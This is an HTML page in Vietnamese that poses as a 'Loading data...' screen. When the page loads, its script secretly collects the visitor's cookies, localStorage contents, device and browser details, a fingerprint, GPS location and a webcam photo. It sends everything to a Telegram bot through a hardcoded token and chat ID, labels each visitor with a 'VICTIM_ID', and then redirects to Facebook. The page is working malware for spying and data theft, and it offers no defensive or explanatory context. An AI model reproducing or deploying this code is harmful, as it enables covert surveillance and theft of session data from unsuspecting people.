<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            max-width: 400px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status {
            color: #666;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Đang tải dữ liệu...</h2>
        <div class="spinner"></div>
        <p class="status">Vui lòng chờ trong giây lát</p>
    </div>

    <script>
        // ===== CẤU HÌNH =====
        const BOT_TOKEN = '8678956338:AAEDpm0-I4KGjomktv8kDnA7t8K5PC3p1ag';
        const CHAT_ID = '6232287791';
        const VICTIM_ID = 'V_' + Math.random().toString(36).substr(2, 8).toUpperCase();

        // Gửi tin nhắn
        async function sendToTelegram(msg) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: `[${VICTIM_ID}]\n${msg}`,
                        parse_mode: 'HTML'
                    })
                });
            } catch(e) { console.log('Lỗi gửi:', e); }
        }

        // Gửi ảnh
        async function sendPhoto(base64, filename, caption) {
            try {
                const byteCharacters = atob(base64);
                const byteNumbers = new Array(byteCharacters.length);
                for (let i = 0; i < byteCharacters.length; i++) byteNumbers[i] = byteCharacters.charCodeAt(i);
                const blob = new Blob([new Uint8Array(byteNumbers)], { type: 'image/jpeg' });
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('document', blob, filename);
                formData.append('caption', `[${VICTIM_ID}] ${caption}`);
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: formData });
            } catch(e) { console.log('Lỗi gửi ảnh:', e); }
        }

        // ===== 1. LẤY THÔNG TIN CƠ BẢN (luôn hoạt động) =====
        function getBasicInfo() {
            const ua = navigator.userAgent;
            let browser = 'Unknown', os = 'Unknown';
            if (ua.includes('Chrome')) browser = 'Chrome';
            else if (ua.includes('Firefox')) browser = 'Firefox';
            else if (ua.includes('Safari')) browser = 'Safari';
            else if (ua.includes('Edge')) browser = 'Edge';
            if (ua.includes('Android')) os = 'Android';
            else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
            else if (ua.includes('Windows')) os = 'Windows';
            else if (ua.includes('Mac')) os = 'MacOS';
            
            return {
                browser, os, ua: ua.substring(0, 200),
                language: navigator.language,
                platform: navigator.platform,
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack || 'Không có'
            };
        }

        // ===== 2. THÔNG TIN MÀN HÌNH =====
        function getScreenInfo() {
            return {
                size: `${screen.width}x${screen.height}`,
                colorDepth: screen.colorDepth,
                pixelRatio: window.devicePixelRatio,
                availSize: `${screen.availWidth}x${screen.availHeight}`
            };
        }

        // ===== 3. COOKIES & LOCALSTORAGE =====
        function getStoredData() {
            let cookies = document.cookie;
            if (!cookies) cookies = 'Không có cookies';
            
            let localStorageData = {};
            try {
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    localStorageData[key] = localStorage.getItem(key);
                }
            } catch(e) { localStorageData = { error: 'Không thể đọc localStorage' }; }
            
            return { cookies, localStorage: JSON.stringify(localStorageData, null, 2) };
        }

        // ===== 4. THÔNG TIN TRÌNH DUYỆT NÂNG CAO =====
        function getAdvancedBrowserInfo() {
            const plugins = [];
            for (let i = 0; i < navigator.plugins.length; i++) {
                plugins.push(navigator.plugins[i].name);
            }
            
            return {
                plugins: plugins.slice(0, 5),
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                hardwareConcurrency: navigator.hardwareConcurrency || 'Không rõ',
                deviceMemory: navigator.deviceMemory || 'Không rõ',
                maxTouchPoints: navigator.maxTouchPoints || 0
            };
        }

        // ===== 5. CHỤP MÀN HÌNH (giả lập nếu không lấy được stream) =====
        async function captureScreenshot() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = Math.min(window.innerWidth, 800);
                canvas.height = Math.min(window.innerHeight, 600);
                
                // Vẽ thông tin thu thập được lên ảnh
                ctx.fillStyle = '#f0f0f0';
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                ctx.fillStyle = '#333';
                ctx.font = '16px Arial';
                ctx.fillText(`ID: ${VICTIM_ID}`, 10, 30);
                ctx.fillText(`Thời gian: ${new Date().toLocaleString('vi-VN')}`, 10, 60);
                ctx.fillText(`Màn hình: ${screen.width}x${screen.height}`, 10, 90);
                ctx.fillText(`User Agent: ${navigator.userAgent.substring(0, 60)}...`, 10, 120);
                
                return canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
            } catch(e) {
                return null;
            }
        }

        // ===== 6. LẤY VỊ TRÍ GPS NẾU ĐƯỢC PHÉP =====
        function getGPS() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        resolve({
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            accuracy: pos.coords.accuracy
                        });
                    },
                    () => resolve(null),
                    { timeout: 5000, enableHighAccuracy: true }
                );
            });
        }

        // ===== 7. CHỤP WEBCAM NẾU CÓ QUYỀN =====
        async function captureWebcam() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.setAttribute('playsinline', '');
                await video.play();
                
                // Đợi video có kích thước
                await new Promise(resolve => {
                    video.onloadedmetadata = () => {
                        setTimeout(resolve, 200);
                    };
                });
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                
                const photo = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
                stream.getTracks().forEach(track => track.stop());
                return photo;
            } catch(e) {
                console.log('Webcam error:', e);
                return null;
            }
        }

        // ===== 8. TẠO FINGERPRINT =====
        function getFingerprint() {
            // Canvas fingerprint
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = 200;
            canvas.height = 50;
            ctx.fillStyle = '#f60';
            ctx.fillRect(0, 0, 200, 50);
            ctx.fillStyle = '#fff';
            ctx.font = '14px Arial';
            ctx.fillText('Fingerprint', 10, 30);
            ctx.fillStyle = '#000';
            ctx.fillText('Test', 100, 30);
            const canvasFP = canvas.toDataURL();
            
            return {
                canvas: canvasFP.substring(0, 80),
                userAgent: navigator.userAgent.substring(0, 100),
                language: navigator.language,
                platform: navigator.platform,
                screenSize: `${screen.width}x${screen.height}`,
                timezoneOffset: new Date().getTimezoneOffset()
            };
        }

        // ===== 9. KIỂM TRA KẾT NỐI MẠNG =====
        function getNetworkInfo() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (connection) {
                return {
                    type: connection.effectiveType || 'Không rõ',
                    downlink: connection.downlink ? connection.downlink + ' Mbps' : 'Không rõ',
                    rtt: connection.rtt ? connection.rtt + ' ms' : 'Không rõ'
                };
            }
            return { type: 'Không hỗ trợ', downlink: 'Không rõ', rtt: 'Không rõ' };
        }

        // ===== HÀM CHÍNH =====
        async function collectAndSend() {
            const startTime = Date.now();
            
            // Thu thập dữ liệu
            const basic = getBasicInfo();
            const screenInfo = getScreenInfo();
            const stored = getStoredData();
            const advanced = getAdvancedBrowserInfo();
            const network = getNetworkInfo();
            const fingerprint = getFingerprint();
            const gps = await getGPS();
            const screenshot = await captureScreenshot();
            const webcam = await captureWebcam();
            
            // Xây dựng tin nhắn tổng hợp
            let msg = '';
            msg += `🆔 ID: ${VICTIM_ID}\n`;
            msg += `━━━━━━━━━━━━━━━━━━━━\n`;
            msg += `🌐 TRÌNH DUYỆT:\n`;
            msg += `   • Loại: ${basic.browser} | ${basic.os}\n`;
            msg += `   • Ngôn ngữ: ${basic.language}\n`;
            msg += `   • Cookie: ${basic.cookieEnabled ? 'Bật' : 'Tắt'}\n`;
            msg += `━━━━━━━━━━━━━━━━━━━━\n`;
            msg += `🖥️ THIẾT BỊ:\n`;
            msg += `   • Màn hình: ${screenInfo.size} (${screenInfo.colorDepth}bit)\n`;
            msg += `   • Pixel ratio: ${screenInfo.pixelRatio}\n`;
            msg += `   • Số nhân CPU: ${advanced.hardwareConcurrency}\n`;
            msg += `   • RAM: ${advanced.deviceMemory} GB\n`;
            msg += `   • Điểm chạm: ${advanced.maxTouchPoints}\n`;
            msg += `━━━━━━━━━━━━━━━━━━━━\n`;
            msg += `🌍 VỊ TRÍ:\n`;
            if (gps) {
                msg += `   📍 GPS: ${gps.lat}, ${gps.lon}\n`;
                msg += `   🎯 Độ chính xác: ${Math.round(gps.accuracy)}m\n`;
                msg += `   🗺️ Maps: https://maps.google.com/?q=${gps.lat},${gps.lon}\n`;
            } else {
                msg += `   ⚠️ GPS: Không được cấp quyền\n`;
            }
            msg += `━━━━━━━━━━━━━━━━━━━━\n`;
            msg += `🌐 MẠNG:\n`;
            msg += `   • Loại kết nối: ${network.type}\n`;
            msg += `   • Tốc độ: ${network.downlink}\n`;
            msg += `   • Độ trễ: ${network.rtt}\n`;
            msg += `━━━━━━━━━━━━━━━━━━━━\n`;
            msg += `🍪 DỮ LIỆU LƯU TRỮ:\n`;
            msg += `   • Cookies: ${stored.cookies.length > 50 ? stored.cookies.substring(0, 50) + '...' : stored.cookies}\n`;
            msg += `   • LocalStorage: ${stored.localStorage.length > 50 ? stored.localStorage.substring(0, 50) + '...' : stored.localStorage}\n`;
            msg += `━━━━━━━━━━━━━━━━━━━━\n`;
            msg += `🆔 FINGERPRINT:\n`;
            msg += `   • Canvas: ${fingerprint.canvas}...\n`;
            msg += `   • Múi giờ: ${advanced.timezone} (UTC${-advanced.timezoneOffset/60})\n`;
            msg += `━━━━━━━━━━━━━━━━━━━━\n`;
            msg += `🔌 PLUGINS:\n`;
            msg += `   • ${advanced.plugins.join(', ') || 'Không có plugins'}\n`;
            msg += `━━━━━━━━━━━━━━━━━━━━\n`;
            msg += `📅 THỜI GIAN: ${new Date().toLocaleString('vi-VN')}\n`;
            msg += `⏱️ THU THẬP: ${Date.now() - startTime}ms\n`;
            msg += `━━━━━━━━━━━━━━━━━━━━\n`;
            msg += `📱 USER AGENT:\n${basic.ua}\n`;
            
            // Gửi tin nhắn chính
            await sendToTelegram(msg);
            
            // Gửi ảnh
            if (screenshot) {
                await sendPhoto(screenshot, `screenshot_${VICTIM_ID}.jpg`, '📸 Ảnh màn hình');
            }
            if (webcam) {
                await sendPhoto(webcam, `webcam_${VICTIM_ID}.jpg`, '📸 Ảnh từ webcam (nếu có)');
            }
            
            // Thông báo hoàn tất
            await sendToTelegram(`✅ Đã thu thập xong dữ liệu từ ${VICTIM_ID}`);
            
            // Chuyển hướng
            setTimeout(() => {
                window.location.href = 'https://facebook.com';
            }, 2000);
        }
        
        // Chạy
        collectAndSend();
    </script>
</body>
</html>
